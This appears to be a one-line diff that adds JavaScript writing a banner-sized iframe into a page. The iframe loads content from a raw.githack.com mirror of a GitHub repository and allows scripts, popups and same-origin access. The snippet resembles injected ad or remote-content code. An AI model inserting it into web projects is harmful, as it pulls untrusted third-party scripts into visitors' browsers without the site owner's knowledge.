@@ -1,0 +1,1 @@
+var qs = Math.round(Math.random()*10000000); document.writeln('<iframe src="https://raw.githack.com/GenaDevcode/img/tree/main" width="728" height="90" frameborder="0" marginheight="0" marginwidth="0" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="width:728px !important;height:90px !important;"></iframe>');
